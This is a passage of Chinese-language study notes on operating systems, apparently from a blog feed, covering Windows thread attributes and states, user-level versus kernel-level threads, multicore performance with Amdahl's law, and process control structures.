计数器：记录进程中线程已执行的I/O操作的<strong>数量</strong>和<strong>类型的变量</strong></li><li>VM操作计数器：记录进程中线程<strong>已执行</strong>的<strong>虚存</strong>操作的<strong>数量</strong>和<strong>类型的变量</strong></li><li>异常/调试端口：进程中的一个线程引发异常时，进程管理器发送消息所用的<strong>进程间通信通道</strong>。正常情况下，这些通道分别连接到<strong>环境子系统</strong>和<strong>调试器进程</strong></li><li>退出状态：进程终止的<strong>原因</strong></li></ul></li></ul></li><li>线程<ul><li>是<strong>顺序执行</strong>的<strong>可分派工作单元</strong></li><li><strong>可中断</strong>的，因此<strong>处理器</strong>可以切换到另一个线程</li><li>线程的某些属性值是从进程的属性值得到的<ul><li>例如，在多处理器系统中，线程处理器亲和性是可以执行该线程的处理器集合，该集合等于进程处理器亲和性或其子集</li></ul></li><li>Windows线程对象属性<ul><li>线程ID、线程处理器亲和性、线程退出状态</li><li>线程上下文：定义<strong>线程执行状态</strong>的<strong>一组寄存器值</strong>和其他<strong>易失的数据</strong></li><li><strong>动态</strong>优先级：线程在任何给定时刻的执行优先级</li><li><strong>基本</strong>优先级：线程<strong>动态</strong>优先级的<strong>下限</strong></li><li>线程执行时间：线程在<strong>用户模式和内核模式</strong>下执行时间的累积值</li><li>警告状态：表示线程是否将执行一个<strong>异步过程调用</strong>的标志</li><li>挂起计数：线程的执行被挂起但<strong>未被恢复</strong>的次数</li><li>代理令牌（Impersonation token）：允许线程代表另一个进程执行操作的临时访问令牌（供子系统使用）</li><li>终止端口：线程终止时，进程管理器发送消息所用的进程间通信通道（供子系统使用）</li></ul></li></ul></li></ul><h3 id="4-4-4-多线程">4.4.4 多线程</h3><ul><li>由于不同进程中的线程可并发执行（看起来同时执行），因此 Windows 支持<strong>进程间的并发性</strong></li><li>同一个进程中的多个线程可以分配给不同的处理器并同时执行（实际上同时执行）</li><li>一个含有多线程的进程在实现并发时，不需要使用多进程的开销</li><li><u>同一个进程中的线程</u>可通过它们的<strong>公共地址空间</strong>交换信息，并访问进程中的共享资源</li><li><u>不同进程中的线程</u>可通过<u>在两个进程间建立</u>的<strong>共享内存</strong>交换信息</li></ul><h3 id="4-4-5-线程状态">4.4.5 线程状态</h3><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BA%BF%E7%A8%8B%EF%BC%88%E4%B8%8B%EF%BC%89/os4.11.jpg" class=""><ul><li>就绪态∶<ul><li><strong>内核分派器</strong>跟踪所有就绪线程，并按<strong>优先级</strong>顺序进行<strong>调度</strong></li></ul></li><li>备用态∶<ul><li>备用线程已被选择下次在某个<strong>特定处理器</strong>上运行</li><li>备用线程在备用态等待，直到那个处理器可用</li><li>若备用线程的优先级足够高，可<strong>抢占</strong>处理器上运行的线程。否则<strong>等待</strong>其被阻塞或时间片结束时才能运行</li></ul></li><li>运行态∶<ul><li>内核分派器执行了线程切换后，备用线程将进入运行态并开始执行</li><li>执行过程一直持续到该线程被抢占（回到就绪态）、用完时间片（回到就绪态）、被阻塞或终止</li></ul></li><li>等待态：</li><li>原因：<ul><li>线程被一个事件（如I/O）阻塞</li><li>为了同步自愿等待</li><li>一个环境子系统指引它把自身挂起</li></ul></li><li>等待的条件满足时，如果其<strong>所有资源都可用</strong>，线程将转到<strong>就绪态</strong></li><li>过渡态：</li><li>一个线程在等待后，如果<strong>准备好运行</strong>但<strong>资源不可用</strong>时，进入该状态（如一个线程的栈被换出内存）</li><li>当该资源可用时，线程进入<strong>就绪态</strong></li><li>终止态∶<ul><li>完成清理工作后，该线程就从系统中移出，或被执行体保留，供以后重新初始化<ul><li>关于Windows执行体的描述见第2章。它包含基本操作系统服务，如存储管理、进程和线程管理、安全、I/O及进程间通信</li></ul></li></ul></li></ul><h3 id="4-4-6-对操作系统子系统的支持">4.4.6 对操作系统子系统的支持</h3><ul><li><p>操作系统子系统的责职：利用 Windows 进程和线程的特征来模仿相应操作系统中的进程与线程软件</p><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BA%BF%E7%A8%8B%EF%BC%88%E4%B8%8B%EF%BC%89/osw3.jpg" class=""></li><li><p>Windows创建一个进程时，它不会自动创建线程</p></li><li><p>在 Win32中，一个新进程往往和一个线程一起创建。因此，Win32子系统再次调用Windows 进程管理器，为这个新进程创建 一个线程，并从Windows接收该线程的句柄，正确的线程和进程信息返回给应用程序</p></li><li><p>执行体创建一个新进程时，这个新进程会继承创建它的进程的许多属性。但是间接创建时就不希望是继承了服务器进程的特性，而是要继承客户端进程的特性，所以Windows 允许子系统指定新进程的父进程</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>操作系统</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>第四章-进程和线程（一）</title>
    <link href="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BA%BF%E7%A8%8B%EF%BC%88%E4%B8%8A%EF%BC%89/"/>
    <url>/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BA%BF%E7%A8%8B%EF%BC%88%E4%B8%8A%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1>4.1 进程和线程</h1><ul><li><p>回顾进程的特点</p><ul><li>资源所有权，Resource ownership<ul><li>进程包括存放<u>进程映像</u>的<u>虚拟地址空间</u></li><li>进程映像是程序、数据、栈和进程控制块中定义的<strong>属性集</strong></li><li>进程总具有对资源的<strong>控制权或所有权</strong></li><li><strong>操作系统</strong>提供预防进程间发生<u>不必要资源冲突</u>的<strong>保护功能</strong></li></ul></li><li>调度/执行，Scheduling/execution<ul><li>进程具有<strong>执行态</strong>（运行、就绪等）和分配给其的<strong>优先级</strong>，是可<u>被操作系统调度和分派</u>的<strong>实体</strong></li></ul></li></ul></li><li><p>两个特点<strong>独立</strong>，因此操作系统应能<u>分别处理</u>它们</p></li><li><p>拥有<u>资源所有权</u>的单位：<strong>进程（process）<strong>或</strong>任务（task）</strong></p><p>将<strong>分派</strong>的单位：<strong>线程</strong>或<strong>轻量级进程（Light Weight Process， LWP）</strong></p></li></ul><h3 id="4-1-1-多线程，Multithreading">4.1.1 多线程，Multithreading</h3><ul><li><p>多线程：<strong>操作系统</strong>在<strong>单个进程内</strong>支持多个<strong>并发执行路径</strong>的<strong>能力</strong></p></li><li><p>每个进程中仅执行单个线程的传统方法（此时还未提出线程的概念）称为<strong>单线程方法（single-threaded approach）</strong></p></li><li><p>在多线程环境中，进程定义为<strong>资源分配单元</strong>和一个<strong>保护单元</strong></p></li><li><p>与进程相关联的有</p><ul><li>容纳进程映像的虚拟地址空间</li><li>对处理器、其他进程（（用于进程间通信）、文件和 I/O资源（设备和通道）的<strong>受保护访问</strong></li></ul></li><li><p>一个进程中可能有一个或多个线程，每个线程都有∶</p><ul><li>一个线程<strong>执行状态</strong></li><li><strong>未运行时</strong>保存的<strong>线程上下文</strong>（thread context），<u>线程可视为在进程内运行的一个<strong>独立程序计数器</strong></u></li><li>一个<strong>执行栈</strong></li><li>每个线程用于<strong>局部变量</strong>的一些<strong>静态存储空间</strong></li><li>与进程内其他线程<u>共享的</u>**内存和资源的访问</li></ul></li><li><p>线程和进程的区别（进程管理的角度）</p><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BA%BF%E7%A8%8B%EF%BC%88%E4%B8%8A%EF%BC%89/os4.2.jpg" class=""><ul><li>进程中的<strong>所有线程</strong>共享该进程的<strong>状态和资源</strong>，所有线程都<strong>驻留在同一块地址空间中</strong>，并<strong>可访问相同的数据</strong><ul><li>若一个线程以读权限打开一个文件，那么同一进程中的其他线程也能从这个文件中读取数据</li></ul></li></ul></li><li><p>线程的如下优点</p><ul><li>在已有进程中<strong>创建一个新线程的时间</strong>，远少于创建一个全新进程的时间<ul><li>Mach开发人员的研究表明，线程创建要比在 UNIX中创建进程快10倍</li></ul></li><li><strong>终止线程</strong>要比终止进程所花的<strong>时间</strong>少</li><li>同一进程内线程间<strong>切换的时间</strong>，要少于进程间切换的时间</li><li>线程提高了不同执行程序间通信的效率<ul><li>在多数操作系统中，<u>独立进程间的通信需要<strong>内核</strong>介入</u>，以提供<strong>保护</strong>和<strong>通信</strong>所需的机制</li><li>由于同一进程中的<u>多个线程共享内存和文件</u>， 因此它们<strong>无须调用内核</strong>就可互相通信</li></ul></li><li>==》若将一个应用程序或函数实现为一组相关联的执行单元，则用一组线程要比用一组分离的进程更有效</li></ul></li><li><p>实例：文件服务器</p><ul><li>每个<u>新文件请求到达时</u>，文件管理程序会<u>创建一个新线程</u></li><li>服务器需要处理很多请求，因此会在<u>短期内创建和销毁许多线程</u></li><li>服务器运行在<u>多处理器机器</u>上时，<u>同一进程中的多个线程</u>可以同时在<u>不同处理器上执行</u></li><li>此外，由于文件服务中的进程或线程须<u><strong>共享</strong>文件数据</u>，并据此<strong>协调</strong>它们的行为，因此使用线程和共享内存要比使用进程和消息传递消息的速度<strong>快</strong></li></ul></li><li><p>在<u>单用户多处理系统</u>中使用线程的例子</p><ul><li>前台和后台工作：输入和更新</li><li><strong>异步处理</strong>∶程序中的异步元素可用线程来实现<ul><li>例如，为避免掉电带来的损失，往往把文字处理程序设计成每隔 1 分钟就把随机存储内存（RAM）缓冲区中的数据写入磁盘。可以创建 一个任务是<u>周期性地进行备份的线程</u>，该线程由<u>操作系统直接调度</u>。这样，主程序中就不需要特别的代码来<u>提供时间检查或协调输入和输出</u></li></ul></li><li>执行速度<ul><li>多线程进程在计算一批数据时，可通过设备读取下一批数据。在多处理器系统中，同一进程中的多个线程可同时执行。这样，既使一个线程在读取数据时被I/O操作阻塞，另一个线程仍然可以继续运行</li></ul></li><li>模块化程序结构</li></ul></li><li><p>在支持线程的操作系统中，调度和分派是在线程基础上完成的，因此大多数与执行相关的信息可以保存在线程级的数据结构中。但是操作系统必须在进程级对它们进行管理，即进程挂起，所有线程挂起，终止就都终止</p></li></ul><h3 id="4-1-2-线程的功能">4.1.2 线程的功能</h3><h6 id="线程状态">线程状态</h6><ul><li>一般来说，<strong>挂起态</strong>对线程没有意义，因此这类状态仅适用于进程</li><li>如果一个进程被换出，由于所有线程都共享该进程的地址空间，因此所有线程都须被换出</li><li>4种与线程状态改变相关的基本操作<ul><li>派生：<ul><li>典型情况下，在派生一个新进程时，同时也会为该进程派生一个线程</li><li>随后，进程中的线程可在<u>同一进程</u>中派生另一个线程，并为新线程<u>提供指令指针和参数</u></li><li>新线程拥有<u>自己的</u>寄存器上下文和栈空间，并放在<strong>就绪队列</strong>中</li></ul></li><li>阻塞<ul><li>线程需要等待个事件时会被阻寒（保存线程的用户寄存器、程序计数器和栈指针），处理器转而执行另一个就绪线程</li></ul></li><li>解除阻塞<ul><li>发生阻塞一个线程的事件时，会将该线程转移到就绪队列中</li></ul></li><li>结束<ul><li>一个线程完成后，会<strong>释放其寄存器上下文和栈</strong></li></ul></li></ul></li></ul><h6 id="线程同步">线程同步</h6><ul><li>一个进程中的<u>所有线程</u>共享<strong>同一个地址空间</strong>和诸如打开的文件之类的<strong>其他资源</strong></li><li>一个线程对资源的任何修改都会影响同一进程中其他线程的环境，因此需要同步各种线程的活动，<u>以便它们<strong>互不干扰</strong>且<strong>不破坏数据结构</strong></u><ul><li>例如，两个线程都试图同时往一个双向链表中增加一个元素时，可能会丢失一个元素或破坏链表结构</li></ul></li></ul><h1>线程分类</h1><h3 id="4-2-1-用户级和内核级线程">4.2.1 用户级和内核级线程</h3><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BA%BF%E7%A8%8B%EF%BC%88%E4%B8%8A%EF%BC%89/os4.jpg" class=""><h6 id="用户级线程">用户级线程</h6><ul><li><p>在纯ULT软件中，管理线程的<u>所有工作</u>都由<strong>应用程序</strong>完成，<strong>内核</strong>意识不到线程的存在</p></li><li><p>任何应用程序都可使用线程库设计成多线程程序</p><ul><li>线程库是管理用户级线程的一个例程包，它含有创建和销毁线程的代码、在线程间传递消息和数据的代码、调度线程执行的代码，以及保存和恢复线程上下文的代码</li></ul><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BA%BF%E7%A8%8B%EF%BC%88%E4%B8%8A%EF%BC%89/os4.5.jpg" class=""></li><li><p>发生在用户空间中和一个进程内的活动（内核并不知道，内核继续以进程为单位进行调度，并为进程指定一个执行状态）</p><ul><li>默认情况下，应用程序从单个线程开始，并在该线程中开始运行，这个应用程序及其线程将分配给一个由内核管理的进程</li><li>应用程序<strong>处于运行态</strong>的任何时刻，都可派生一个在<strong>相同进程</strong>中运行的<strong>新线程</strong></li><li>线程派生是通过调用<strong>线程库</strong>中的<strong>派生例程</strong>实现的<ul><li>通过过程调用，<strong>控制权</strong>传递给派生例程</li><li><strong>线程库</strong>为新线程创建一个<strong>数据结构</strong>，然后使用某种调度算法，把<strong>控制权</strong>传递给该进程中处于<strong>就绪态</strong>的一个线程</li><li>当控制权传递给线程库时，<strong>保存</strong>当前线程的上下文，在控制权从线程库中传递给一个线程时，<strong>恢复</strong>那个线程的上下文<ul><li>上下文实际上包括<strong>用户寄存器的内容</strong>、 <strong>程序计数器</strong>、<strong>栈指针</strong></li></ul></li></ul></li></ul><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BA%BF%E7%A8%8B%EF%BC%88%E4%B8%8A%EF%BC%89/os4.1.jpg" class=""></li><li><p>假设进程 B在其线程2中执行，进程和作为进程一部分的两个用户级线程的状态如图：</p><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BA%BF%E7%A8%8B%EF%BC%88%E4%B8%8A%EF%BC%89/osa.jpg" class=""><ul><li><p>可能情况</p><p>1、线程2中执行的应用程序代码进行一个阻塞进程B的系统调用（如执行一次 I/O 调用）</p><p>​  控制权转交给内核，内核启动 I/O操作，把进程 B 置于阻塞态，并切换到另一个进程</p><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BA%BF%E7%A8%8B%EF%BC%88%E4%B8%8A%EF%BC%89/os4.6b.jpg" class=""><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BA%BF%E7%A8%8B%EF%BC%88%E4%B8%8A%EF%BC%89/osb.jpg" class=""><ul><li>此过程中，根据<u>线程库维护的数据结构</u>，进程 B 的<strong>线程2</strong>仍处于运行状态</li><li>处理器角度：线程2实际上并<u>不处于运行态</u>，只是在<strong>线程库</strong>看来它处于<strong>运行态</strong></li></ul><p>2、</p><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BA%BF%E7%A8%8B%EF%BC%88%E4%B8%8A%EF%BC%89/osc.jpg" class=""><ul><li><p>时钟中断把控制权传递给内核</p><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BA%BF%E7%A8%8B%EF%BC%88%E4%B8%8A%EF%BC%89/os4.6c.jpg" class=""><p>根据线程库维护的数据结构，进程B的线程2仍处于<strong>运行态</strong></p></li></ul><p>3、需要线程1运行=》线程2阻塞=》进程自身保留在运行态</p><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BA%BF%E7%A8%8B%EF%BC%88%E4%B8%8A%EF%BC%89/osd.jpg" class=""><p>:small_blue_diamond:b、c、d是a的过渡态</p><p>:small_blue_diamond:在中断时，进程有可能处于<u>线程切换的中间时刻</u>，即正在从一个线程切换到另一个线程。当该进程被恢复时，线程库得以继续运行，完成线程切换，并把控制权转移给进程中的另一个线程</p></li></ul></li><li><p>使用ULT而非KLT的优点：</p><ul><li>所有线程管理数据结构<u>都在一个进程的用户地址空间中</u>，<u>线程切换不需要<strong>内核模式特权</strong></u>， 因此进程不需要为了管理线程而切换到内核模式，进而节省了<strong>两次</strong>状态转换 （从用户模式到内核模式，以及从内核模式返回用户模式）的开销。</li><li>调度因应用程序的不同而不同。一个应用程序可能更适合简单的<u>轮转调度算法</u>，而另一个应用程序可能更适合<u>基于优先级的调度算法</u>。为了<u>不要乱底层的操作系统调度程序</u>，可以做到为应用程序量身定做调度算法</li><li>ULT 可在<strong>任何操作系统</strong>中运行，不需要对底层内核进行修改以支持 ULT。线程库是供<strong>所有应用程序共享</strong>的一组<u>应用级函数</u></li></ul></li><li><p>与KLT相比，ULT也有两个明显的缺点∶</p><ul><li>在典型的操作系统中，<u>许多系统调用都会引起阻塞</u>。因此，在ULT执行一个系统调用时， 不仅会阻塞这个线程，也会阻塞进程中的<strong>所有线程</strong></li><li>在纯ULT策略中，多线程应用程序不能利用<strong>多处理技术</strong>。内核一次只把<strong>一个进程</strong>分配给<strong>一个处理器</strong>，<u>因此一个进程中只有一个线程可以执行</u>，这相当于在一个进程内实现了应用级多道程序设计。虽然多道程序设计可明显提高应用程序的速度，但同时执行部分代码更会使某些应用程序受益</li></ul></li><li><p>解决方案</p><ul><li>把应用程序写成一个多进程程序而非多线程程序，但切换又变成进程间切换，开销过大</li><li>利用**“套管”（jacketing）**技术：把一个产生阻塞的系统调用转化为一个非阻塞的系统调用<ul><li>如替代直接调用一个系统 I/O 例程，让线程调用一个<strong>应用级的J/O套管例程</strong></li><li>这个套管例程中的代码用于检查并确定 I/O设各是否忙。如果忙，该线程进入<strong>阻塞态</strong>并把控制权传送给另一个线程。这个线程重新获得控制权后，套管例程会再次检查 I/O设备</li></ul></li></ul></li></ul><h6 id="内核级线程">内核级线程</h6><ul><li>在纯KLT软件中，<u>管理线程的所有工作</u>均由<strong>内核</strong>完成。应用级没有线程管理代码， <u>只有一个到内核线程设施的应用编程接口</u>（API）[Windows用这样的方法]</li><li>内核为进程及进程内的每个线程<strong>维护上下文信息</strong></li><li><strong>调度</strong>由<strong>内核</strong>基于<strong>线程</strong>完成</li><li>优点：克服了ULT方法的两个缺点<ul><li>内核可以同时把同一个进程中的多个线程调度到多个处理器中</li><li>进程中的一个线程被阻塞时，内核可以调度同一个进程中的另一个线程。</li><li><strong>内核例程</strong>自身也可是<strong>多线程</strong>的</li></ul></li><li>缺点：<ul><li>在把<strong>控制权</strong>从一个线程传送到同一个进程内的另一个线程时，需要切换到<strong>内核模式</strong></li></ul></li></ul><h3 id="4-1-2-其他方案">4.1.2 其他方案</h3><ul><li><p>线程和进程间的关系</p><table><thead><tr><th>线程∶进程</th><th>描 述</th><th>实例系统</th></tr></thead><tbody><tr><td>1:1</td><td>执行的每个线程是唯一的进程，它有自己的地址空间和资源</td><td>传统UNIX</td></tr><tr><td>M:1</td><td>一个进程定义了一个地址空间和动态资源所有权，可以在该进程中创建和执行多个线程</td><td>ndows NT、Solaris Linux, OS/2、 OS/390、MACH</td></tr><tr><td>1:M</td><td>一个线程可以从一个进程环境迁移到另一个进程环境。允许线程轻松地在不同系统中移动</td><td>Ra(Clouds)、Emerald</td></tr><tr><td>M:N</td><td>结合了M∶1和 1∶M 的属性</td><td>TRIX</td></tr></tbody></table></li></ul><h1>4.3 多核和多线程</h1><ul><li>使用<u>多核系统</u>支持<u>单个<strong>多线程</strong>应用程序</u>：工作站、游戏机、正运行<strong>处理器密集型应用</strong>的个人计算机</li></ul><h3 id="4-3-1-多核系统上的软件性能">4.3.1 多核系统上的软件性能</h3><ul><li><p>多核组织结构带来的性能提升，取决于<strong>应用程序</strong>有效利用<strong>并行资源</strong>的能力</p></li><li><p>Amdahl定律：</p><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mfrac><mtext>在单个处理器上执行程序的时间</mtext><mrow><mtext>在</mtext><mi>N</mi><mtext>个并行处理器上执行程序的时间</mtext></mrow></mfrac><mo>=</mo><mfrac><mn>1</mn><mrow><mo stretchy="false">(</mo><mn>1</mn><mo>−</mo><mi>f</mi><mo stretchy="false">)</mo><mo>+</mo><mi>f</mi><mi mathvariant="normal">/</mi><mi>N</mi></mrow></mfrac></mrow><annotation encoding="application/x-tex">\frac{在单个处理器上执行程序的时间}{在N个并行处理器上执行程序的时间}=\frac{1}{(1-f)+ f/ N}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.0463em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3603em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">在</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord cjk_fallback">个并行处理器上执行程序的时间</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">在单个处理器上执行程序的时间</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.2574em;vertical-align:-0.936em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord">/</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.936em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p>该定律假设程序执行时间的 1/(1-f) 所涉及的代码本质上是串行的，其余f分之一所涉及的代码是无限并行的，并且没有调度开销</p></li><li><p>(服务器软件)<u>数据库管理系统</u>、<u>数据库应用程序</u>、许多不同类型的 <u>服务器程序</u>能有效地使用多核系统并行化的多核组织结构（因为服务器程序通常会<u>并行地处理许多相对独立的事务</u>）</p></li><li><p>其他适用：</p><ul><li>原生多线程应用程序∶<strong>多线程应用程序</strong>的特征是<u>具有少数几个</u><strong>高度线程化</strong>的进程。线程化应用程序的例子包括 Lotus Domino 和 Siebel CRM（客户关系管理）</li><li>多进程应用程序∶多进程应用程序的特征是具有多个单线程的进程。多进程应用程序的例子 包括 Oracle 数据库、SAP和 PeopleSoft</li><li>Java应用程序∶Java从根本上支持线程的概念。不仅 Java 语言本身能够很方便地支持多线程应用程序开发，Java 虚拟机也是一个多线程进程，它为 Java 应用程序提供调度机制和内存管理</li><li>多实例应用程序∶应用程序实例需要一定程度上的<strong>隔离性</strong>时，可使用虚拟化技术（虚拟出支撑操作系统的硬件）为每个实例提供独立、安全的环境</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>操作系统</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>第三章-进程描述和控制（二）</title>
    <link href="/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%9B%E7%A8%8B%E6%8F%8F%E8%BF%B0%E5%92%8C%E6%8E%A7%E5%88%B6%EF%BC%88%E4%B8%8B%EF%BC%89/"/>
    <url>/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%9B%E7%A8%8B%E6%8F%8F%E8%BF%B0%E5%92%8C%E6%8E%A7%E5%88%B6%EF%BC%88%E4%B8%8B%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1>3.3进程描述</h1><ul><li>把操作系统视为<strong>管理系统资源</strong>的实体：<ul><li>控制计算机系统<strong>内部的事件</strong></li><li>为<strong>处理器</strong>执行进程进行<strong>调度和分派</strong></li><li>给<strong>进程</strong>分配<strong>资源</strong>， 并响应<strong>用户程序</strong>的<strong>基本服务请求</strong></li></ul></li></ul><h3 id="3-3-1操作系统的控制结构，Operating-System-Control-Structures">3.3.1操作系统的控制结构，Operating System Control Structures</h3><ul><li><p>操作系统<strong>构造并维护</strong>其管理的每个实体的<strong>信息表</strong>→必须掌握每个进程和资源的<strong>当前状态</strong>→<strong>管理</strong>进程和资源</p></li><li><p>信息表的基本分类：内存、I/O、文件、进程</p><img src="/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%9B%E7%A8%8B%E6%8F%8F%E8%BF%B0%E5%92%8C%E6%8E%A7%E5%88%B6%EF%BC%88%E4%B8%8B%EF%BC%89/os3.11.jpg" class=""></li><li><p><strong>内存表（<em>memory table</em>）</strong></p><ul><li>用于跟踪内（实）存和外（虚）存</li><li>内存的某些部分为操作系统保留，剩余部分供进程使用</li><li>外存中保存的进程使用某种<strong>虚存</strong>或简单的<strong>交换机制</strong></li><li>内存表必须包含的信息<ul><li>分配给进程的<strong>内存</strong></li><li>分配给进程的<strong>外存</strong></li><li>内存块或虚存块的<strong>任何保护属性</strong>，如哪些进程可以访问某些共享内存区域</li><li><strong>管理虚存</strong>所需要的<strong>任何信息</strong></li></ul></li></ul></li><li><p>内存表</p><ul><li>操作系统使用I/O表管理计算机系统中的 <strong>I/O 设备</strong>和<strong>通道</strong></li><li>正在进行 I/O操作时，操作系统需要知道 I/O操作的状态，以及作为I/O传送的<strong>源与目标的内存单元</strong></li></ul></li><li><p>文件表（file table）</p><ul><li>文件表提供关于文件<strong>是否存在</strong>、文件<strong>在外存中的位置</strong>、<strong>当前状态</strong>、<strong>其他属性</strong>的信息</li><li>部分信息（非全部信息）可能由<strong>文件管理系统</strong>维护和使用。此时，操作系统仅<strong>有少许或没有</strong>关于文件的信息</li></ul></li><li><p>进程表（process tables）</p><ul><li>内存、I/O和文件是代表进程而被管理的，因此进程表中以须有对这些资源的<strong>直接或间接引用</strong></li></ul></li><li><p>这些表自身必须可被操作系统访问到，因此它们受制于内存管理</p></li><li><p>配置问题：操作系统必须具有基本环境的一些信息，如有多少内存空间、I/O 设备是什么及它们的标识符是什么</p></li></ul><h3 id="3-3-2进程控制结构">3.3.2进程控制结构</h3><ul><li><p>操作系统在管理和控制进程时，首先要知道<strong>进程的位置</strong>，其次要知道<strong>进程的属性</strong></p></li><li><p>进程位置</p><ul><li><p><strong>进程控制块（<em>process control block</em>）</strong>：进程相关的<strong>属性集</strong></p></li><li><p><strong>进程映像（<em>process image</em>）</strong>：程序、数据、栈、属性的集合</p></li><li><p>进程映像中的典型元素</p><table><thead><tr><th>项目</th><th>说明</th></tr></thead><tbody><tr><td>用户数据</td><td>用户空间中的<strong>可修改</strong>部分，包括程序数据、用户栈区域和可修改的程序</td></tr><tr><td>用户程序</td><td>待执行的程序</td></tr><tr><td>栈</td><td>每个进程有一个或多个后进先出（LIFO）栈，栈用于保存参数、过程调用地址和系统调用地址</td></tr><tr><td>进程控制块</td><td>操作系统控制进程所需的数据</td></tr></tbody></table></li><li><p>进程映像的位置取决于所用的内存管理方案，（最简单）进程映像保存在<strong>相邻</strong>的内存块中或<strong>连续</strong>的内存块中</p></li><li><p>存储块位于外存（通常是磁盘）中，因此在操作系统管理进程时，其进程映像<strong>至少应有一部分</strong>位于内存中</p></li><li><p>要执行该进程，则必须将整个进程映像载入<strong>内存</strong>中或至少载入<strong>虚存</strong>中</p></li><li><p>现代操作系统假定<strong>分页硬件</strong>允许使用<strong>不连续的物理内存</strong>来支持部分<strong>常驻内存</strong>的进程</p></li><li><p>在任意时刻，进程映像的一部分可在内存中，剩余部分可在外存中</p></li><li><p>操作系统维护的进程表必须给出<strong>每个进程映像</strong>中的<strong>每页的位置</strong></p></li><li><p>有一个主进程表，每个进程在表中都有一个<strong>表项</strong>，每个表项<strong>至少包含一个</strong>指向<strong>进程映像</strong>的<strong>指针</strong></p></li><li><p>如果进程映像包括<strong>多个块</strong>，则这一信息直接包含在<strong>主进程表</strong>中，或通过<strong>交叉引用</strong>内存表中的表项得到</p></li></ul></li><li><p>进程属性</p><ul><li><p>进程控制块信息分类：</p><ul><li>进程<strong>标识</strong>信息</li></ul><table><thead><tr><th></th><th>进程标识信息</th></tr></thead><tbody><tr><td>标识符</td><td>储在进程控制块中的数字标识符，包括<br />● 该进程的标识符（Process ID，简称进程ID）<br />●创建该进程的进程（父进程）的标识符 <br />● 用户标识符（UserID，简称用户ID）</td></tr></tbody></table><ul><li>进程<strong>状态</strong>信息</li></ul><table><thead><tr><th></th><th>处理器状态信息</th></tr></thead><tbody><tr><td>用户可见寄存器</td><td>用户可见寄存器是处理器在<u>用户模式下执行机器语言时可以访问的寄存器</u>。通常有8~32个此类寄存器， 用户可见寄存器而在一些RISC实现中，这种寄存器会超过100</td></tr><tr><td>控制和状态寄存器</td><td>用于控制处理器操作的各种处理器寄存器，包括∶ <br />● 程序计数器∶包含<strong>下一条待取指令的地址</strong><br />● 条件码∶最近<strong>算术或逻辑运算的结果</strong>（如符号、零、进位、等于、溢出）<br />● 